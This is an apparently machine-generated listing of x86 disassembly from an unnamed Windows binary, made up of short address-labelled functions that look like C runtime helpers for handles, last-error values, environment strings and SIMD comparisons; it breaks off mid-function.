mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43062e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43063e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_430650
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_430662
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_430674
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax ecx
pop ebp
retn 0x8
sub_43068a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43069a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_4306ac
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_4306bc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_4306cc
mov edi edi
push esi
mov esi ecx
call [ GetLastError@IAT ]
mov [ esi ] eax
mov eax esi
pop esi
retn
sub_4306dd
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_4306ef
push [ ecx ]
call [ SetLastError@IAT ]
retn
sub_4306f8
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_430700
push [ ecx ]
call sub_42f0c3
pop ecx
retn
sub_430709
push [ ecx ]
call sub_42f07b
pop ecx
retn
sub_430712
push [ ecx ]
call sub_42f07b
pop ecx
retn
sub_43071b
push [ ecx ]
call sub_42f07b
pop ecx
retn
sub_430748
push [ ecx ]
call sub_42f0c3
pop ecx
retn
sub_430751
push [ ecx ]
call sub_42f07b
pop ecx
retn
sub_43075a
push [ ecx ]
call sub_42f0c3
pop ecx
retn
sub_430763
mov eax [ ecx + 0x4 ]
mov eax [ eax ]
push [ eax ]
mov eax [ ecx ]
push [ eax ]
call sub_4309f3
pop ecx
pop ecx
retn
sub_430776
mov eax [ ecx ]
push 0x0
push [ eax ]
call sub_4309f3
pop ecx
pop ecx
retn
sub_430784
push [ ecx ]
call sub_42f0c3
pop ecx
retn
sub_43078d
mov eax [ ecx ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
[ eax ]
retn
sub_430811
mov edi edi
push ebp
mov ebp esp
push rw-data
push [ ebp + 0x8 ]
call sub_430798
pop ecx
pop ecx
pop ebp
retn
sub_430827
mov eax ecx
retn
j_sub_43084b
jmp sub_43084b
sub_4308f9
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_4308ff
mov eax [ ecx ]
retn
sub_4309d9
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_4309e1
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_430a3e
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
push eax
call sub_42f9b7
retn
xor eax eax
retn
sub_430bb3
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov al 0x1
retn
push eax
call sub_42f961
or [ rw-data ] 0xffffffff
__imp_GetCurrentThread
jmp [ GetCurrentThread@IAT ]
__imp_GetCurrentThreadId
jmp [ GetCurrentThreadId@IAT ]
sub_430bd9
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ ebp + 0x8 ]
and ecx 0x1f
ror eax cl
pop ebp
retn
sub_430c3f
mov eax ecx
retn
sub_430d7d
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_430c0e
pop ebp
retn
sub_430d91
mov eax [ rw-data ]
mov ecx eax
xor eax [ rw-data ]
and ecx 0x1f
ror eax cl
retn
sub_430da4
call sub_430b02
test eax eax
jne r-xdata
mov eax [ eax + 0x35c ]
retn
retn
sub_430ec0
mov edi edi
push ebp
mov ebp esp
call sub_430a7e
mov ecx [ ebp + 0x8 ]
mov edx eax
mov eax [ edx + 0x35c ]
mov [ edx + 0x35c ] ecx
pop ebp
retn
sub_430ff5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43109c
push 0x8
call sub_42f0c3
pop ecx
retn
sub_4310a5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov [ eax ] ecx
mov eax [ ebp + 0x8 ]
and [ eax + 0x8 ] 0x0
pop ebp
retn
sub_4310bb
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
mov eax [ eax + 0xc ]
and eax [ ebp + 0x8 ]
sub eax [ ebp + 0x8 ]
neg eax
sbb eax eax
inc eax
pop ebp
retn 0x4
sub_4311ab
push 0x1
call sub_4311b4
pop ecx
retn
sub_431259
push [ ebp - 0x28 ]
call sub_417454
pop ecx
retn
sub_431283
push 0x8
call sub_42f0c3
pop ecx
retn
sub_4312dd
push esi
call sub_417454
pop ecx
retn
sub_4312e5
mov eax [ ecx ]
mov eax [ eax + 0xc ]
shr eax 0x6
and eax 0x1
retn
sub_43150a
push 0x7
call sub_42f0c3
pop ecx
retn
sub_43153f
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d3b1
pop ecx
pop ebp
retn 0x4
sub_431551
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_431561
and [ ecx ] 0x0
mov eax ecx
retn
sub_431567
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_4315cf
push 0x8
call sub_42f0c3
pop ecx
retn
sub_431613
mov eax [ ecx ]
xor edx edx
add eax 0xc
xchg [ eax ] edx
retn
sub_43161d
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_4316e6
push [ ecx ]
call sub_417440
pop ecx
retn
sub_4316ef
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_431ca2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call sub_43d980
add esp 0xc
pop ebp
retn
sub_431cbe
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call sub_43a3af
add esp 0xc
pop ebp
retn
sub_431cda
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call sub_43d9f8
add esp 0xc
pop ebp
retn
sub_431cf6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call sub_43d9f8
add esp 0xc
pop ebp
retn
sub_431d12
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call sub_43d9f8
add esp 0xc
pop ebp
retn
sub_431d2e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call sub_43d7c6
add esp 0xc
pop ebp
retn
sub_431d4a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call sub_43d7c6
add esp 0xc
pop ebp
retn
sub_431d66
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call sub_43d7c6
add esp 0xc
pop ebp
retn
sub_431ded
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
or [ eax ] 0x80
mov al 0x1
pop ebp
retn
sub_431f13
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_431b98
sub_431f1e
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_431c1d
sub_431f9f
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_438db5
pop ecx
retn
sub_431fd3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_431fe5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_431ff5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_432007
push [ ecx ]
call sub_438cfe
pop ecx
retn
sub_432049
push [ ecx ]
call sub_438db5
pop ecx
retn
sub_4321d7
mov eax [ ecx ]
mov eax [ eax + 0x10 ]
retn
sub_4328a3
push esi
call sub_438db5
pop ecx
retn
sub_432e9e
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_432ad8
sub_432ea9
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_432be9
sub_432eb4
mov eax [ ecx ]
mov eax [ eax + 0xc ]
shr eax 0x9
and eax 0x1
retn
sub_432fae
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax [ ebp + 0xc ]
pop ebp
retn
sub_432fc4
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x80
sbb eax eax
neg eax
pop ebp
retn
sub_433017
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
and eax 0x7f
pop ebp
retn
sub_433822
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x94 ]
mov eax [ ebp + 0x8 ]
movzx eax [ ecx + eax ]
pop ebp
retn
sub_43383b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x98 ]
mov eax [ ebp + 0x8 ]
movzx eax [ ecx + eax ]
pop ebp
retn
sub_433854
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x20
pop ebp
retn
sub_43387b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
pop ebp
retn
sub_433888
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x200
push [ ebp + 0x8 ]
call sub_433554
add esp 0xc
pop ebp
retn
sub_43412a
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_434030
add esp 0x10
pop ebp
retn
sub_4342ec
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_434197
add esp 0x14
pop ebp
retn
sub_43489d
vzeroupper
retn
sub_4348a1
retn
sub_4348a2
vpcmpeqb ymm0 ymm0 ymm1
retn
sub_4348a7
vpcmpeqw ymm0 ymm0 ymm1
retn
sub_4348ac
pcmpeqb xmm0 xmm1
retn
sub_4348b1
pcmpeqw xmm0 xmm1
retn
sub_4348b6
vpmovmskb eax ymm0
retn
sub_4348bb
pmovmskb eax xmm0
retn
sub_4348c0
vxorps ymm0 ymm0 ymm0
retn
sub_4348c5
pxor xmm0 xmm0
retn
sub_4354cd
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_44bf10
sub_43577a
mov edi edi
push ebp
mov ebp esp
push 0x1
call sub_41739e
push eax
push [ ebp + 0x8 ]
call sub_43579f
add esp 0xc
pop ebp
retn
sub_435794
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_435654
sub_435812
push esi
call sub_417454
pop ecx
retn
sub_43581a
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43579f
sub_435825
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43577a
sub_435859
mov edi edi
push ebp
mov ebp esp
push 0x1
call sub_41739e
push eax
push [ ebp + 0x8 ]
call sub_43587e
add esp 0xc
pop ebp
retn
sub_435873
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_435830
sub_43597a
push esi
call sub_417454
pop ecx
retn
sub_435982
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43587e
sub_43598d
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_435859
sub_435998
mov ecx [ rw-data ]
xor eax eax
or ecx 0x1
cmp [ rw-data ] ecx
sete al
retn
sub_435a00
call sub_435a3c
xchg cl ch
jmp r-xdata
fpatan
or cl cl
je r-xdata
or ch ch
je r-xdata
fldpi
fsubrp st1
retn
fchs
sub_435a6c
fstp st0
fld [ r--data ]
retn
sub_435a98
fstp st0
mov cl ch
jmp r-xdata
call sub_435a6c
jmp sub_4430dd
sub_435b78
and [ ebp - 0x2c8 ] 0xfe
sub_435dcf
lea edx [ esp + 0x4 ]
call sub_443435
sub_435eff
lea edx [ esp + 0x4 ]
call sub_443435
sub_4361e0
sub esp 0xc
fst [ esp ]
call sub_443478
call sub_4361fd
add esp 0xc
retn
sub_4361f4
lea edx [ esp + 0x4 ]
call sub_443435
sub_436812
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ OutputDebugStringA@IAT ]
pop ebp
retn
sub_436824
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ OutputDebugStringW@IAT ]
pop ebp
retn
sub_436836
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_436846
mov edi edi
push esi
mov esi ecx
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
retn
push [ esi ]
call [ CloseHandle@IAT ]
or [ esi ] 0xffffffff
sub_43685d
xor eax eax
cmp [ ecx ] 0xffffffff
setne al
retn
sub_436866
mov edi edi
push esi
mov esi ecx
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
retn
push [ esi ]
call [ CloseHandle@IAT ]
or [ esi ] 0xffffffff
sub_43687d
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ CloseHandle@IAT ]
neg eax
sbb eax eax
neg eax
pop ebp
retn
sub_436893
mov eax [ ecx ]
retn
sub_436896
or eax 0xffffffff
retn
sub_43689a
xor eax eax
cmp [ ecx ] 0xffffffff
setne al
retn
sub_4368a3
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43655c
sub_4368ae
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_436635
sub_43710a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ FindNextFileA@IAT ]
pop ebp
retn
sub_437121
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ FindNextFileW@IAT ]
pop ebp
retn
sub_437240
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call sub_443cf0
pop ecx
pop ecx
pop ebp
retn
sub_437256
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call sub_43a3e9
pop ecx
pop ecx
pop ebp
retn
sub_43726c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43727c
xor eax eax
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov eax ecx
retn
sub_437289
xor eax eax
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov eax ecx
retn
sub_437296
mov edi edi
push esi
mov esi ecx
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
retn
push [ esi ]
call [ FindClose@IAT ]
or [ esi ] 0xffffffff
sub_4372f7
mov eax sub_4368b9
retn
sub_4372fd
mov eax sub_4368d1
retn
sub_4373b1
mov eax [ ecx ]
retn
sub_4373b4
mov eax [ ecx ]
retn
sub_4373b7
mov edi edi
push esi
mov esi ecx
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
retn
push [ esi ]
call [ FindClose@IAT ]
or [ esi ] 0xffffffff
sub_4373ce
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ FindClose@IAT ]
neg eax
sbb eax eax
neg eax
pop ebp
retn
sub_4373e4
mov eax [ ecx + 0x4 ]
retn
sub_4373e8
mov eax [ ecx + 0x4 ]
retn
sub_4374fa
mov eax [ ecx ]
retn
sub_4374fd
or eax 0xffffffff
retn
sub_437501
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_443d30
sub_43750c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
add eax 0xfffffffe
pop ebp
retn
sub_437519
mov eax [ ecx + 0x4 ]
sub eax [ ecx ]
sar eax 0x2
retn
sub_437522
mov eax [ ecx + 0x4 ]
sub eax [ ecx ]
sar eax 0x2
retn
sub_43752b
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_443cf0
sub_437536
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43a3e9
sub_437541
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4368e9
sub_43754c
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_436a79
sub_43758e
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_42f0c3
pop ecx
retn
sub_4375c2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_4375d4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_4375e6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_4375f6
push [ ecx ]
call sub_42f0c3
pop ecx
retn
sub_4375ff
push [ ecx ]
call sub_42f07b
pop ecx
retn
sub_437a77
cmp [ rw-data ] 0x0
jne r-xdata
mov al 0x1
retn
push 0x1
push 0xfffffffd
call sub_437976
pop ecx
pop ecx
mov [ rw-data ] 0x1
sub_437b26
push 0x5
call sub_42f0c3
pop ecx
retn
sub_437b37
mov eax rw-data
retn
sub_437b3d
mov eax rw-data
retn
sub_437b79
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_437976
pop ecx
pop ecx
pop ebp
retn
sub_437e57
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x107
push [ ebp + 0x8 ]
push 0x0
call sub_437dfe
add esp 0x10
pop ebp
retn
sub_437e72
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x107
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_437dfe
add esp 0x10
pop ebp
retn
sub_437e8e
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x103
push [ ebp + 0x8 ]
push 0x0
call sub_437dfe
add esp 0x10
pop ebp
retn
sub_437ea9
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x103
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_437dfe
add esp 0x10
pop ebp
retn
sub_437f0c
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x117
push [ ebp + 0x8 ]
push 0x0
call sub_437dfe
add esp 0x10
pop ebp
retn
sub_437f27
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x117
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_437dfe
add esp 0x10
pop ebp
retn
sub_437f43
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_437dfe
add esp 0x10
pop ebp
retn
sub_437f5b
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_437dfe
add esp 0x10
pop ebp
retn
sub_437f74
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_437f87
pop ecx
pop ecx
pop ebp
retn
sub_437fd8
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_437dfe
add esp 0x10
pop ebp
retn
sub_437ff0
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_437dfe
add esp 0x10
pop ebp
retn
sub_438009
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_437dfe
add esp 0x10
pop ebp
retn
sub_438021
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_437dfe
add esp 0x10
pop ebp
retn
sub_43803a
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_437dfe
add esp 0x10
pop ebp
retn
sub_438052
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_437dfe
add esp 0x10
pop ebp
retn
sub_43806b
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x157
push [ ebp + 0x8 ]
push 0x0
call sub_437dfe
add esp 0x10
pop ebp
retn
sub_438086
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x157
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_437dfe
add esp 0x10
pop ebp
retn
sub_4380a2
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x10
push [ ebp + 0x8 ]
push 0x0
call sub_437dfe
add esp 0x10
pop ebp
retn
sub_4380ba
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x10
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_437dfe
add esp 0x10
pop ebp
retn
sub_4380d3
mov edi edi
push ebp
mov ebp esp
push 0x8
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_437dfe
add esp 0x10
pop ebp
retn
sub_4380eb
mov edi edi
push ebp
mov ebp esp
push 0x8
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_437dfe
add esp 0x10
pop ebp
retn
sub_438104
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call [ GetCommandLineW@IAT ]
mov [ rw-data ] eax
mov al 0x1
retn
sub_43811d
mov al 0x1
retn
sub_438120
mov eax rw-data
retn
sub_438126
mov eax rw-data
retn
sub_43812c
mov eax rw-data
retn
sub_438132
mov eax rw-data
retn
sub_438138
mov eax rw-data
retn
sub_43813e
mov eax rw-data
retn
sub_438144
mov eax rw-data
retn
sub_4381ac
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_4381bc
mov edi edi
push esi
mov esi ecx
cmp [ esi ] 0x0
je r-xdata
pop esi
retn
push [ esi ]
call [ FreeEnvironmentStringsW@IAT ]
and [ esi ] 0x0
sub_4381d3
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_4381db
mov edi edi
push esi
mov esi ecx
cmp [ esi ] 0x0
je r-xdata
pop esi
retn
push [ esi ]
call [ FreeEnvironmentStringsW@IAT ]
and [ esi ] 0x0
sub_4381f2
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ FreeEnvironmentStringsW@IAT ]
mov al 0x1
pop ebp
retn
sub_43823b
mov eax [ ecx ]
retn
sub_43823e
xor eax eax
retn
sub_438241
xor eax eax
cmp [ ecx ] eax
setne al
retn
j_sub_42a6ce
jmp j_sub_42a6ce#2
j_sub_42a6fd
jmp j_sub_42a6fd#2
sub_4389b8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ SetEnvironmentVariableA@IAT ]
pop ebp
retn
sub_4389cf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ SetEnvironmentVariableW@IAT ]
pop ebp
retn
sub_438b08
mov eax rw-data
retn
sub_438b0e
mov eax rw-data
retn
sub_438b14
mov eax rw-data
retn
sub_438b1a
mov eax rw-data
retn
sub_438b20
mov eax rw-data
retn
sub_438b26
mov eax rw-data
retn
sub_438b2c
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_44c050
sub_438b37
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_44c17b
sub_438b42
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43831c
sub_438b4d
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_438557
sub_438b58
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d3b1
pop ecx
pop ebp
retn 0x4
sub_438b6a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_438b7a
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_438b8c
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_438b94
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_438b9a
mov eax [ ecx ]
retn
sub_438b9d
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_438ba5
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_438cf5
push 0x7
call sub_42f0c3
pop ecx
retn
sub_438ee1
push 0x7
call sub_42f0c3
pop ecx
retn
sub_4390f3
mov eax rw-data
retn
sub_43911f
mov eax [ rw-data ]
retn
sub_439125
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d3b1
pop ecx
pop ebp
retn 0x4
sub_439137
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d3b1
pop ecx
pop ebp
retn 0x4
sub_439149
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_439159
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_439169
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_43917b
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_43918d
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_439193
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_439199
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_4391ab
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_43925b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax [ eax + 0x4 ]
pop ebp
retn
pop ebp
jmp sub_439234
sub_439612
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d3b1
pop ecx
pop ebp
retn 0x4
sub_439624
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_439634
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_439646
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_43964c
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_439e11
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d3b1
pop ecx
pop ebp
retn 0x4
sub_439e23
mov edi edi
push ebp
mov ebp esp
push 0x2
push [ ebp + 0x8 ]
call sub_439ec5
pop ecx
pop ecx
pop ebp
retn
sub_439e36
mov edi edi
push ebp
mov ebp esp
push 0x7
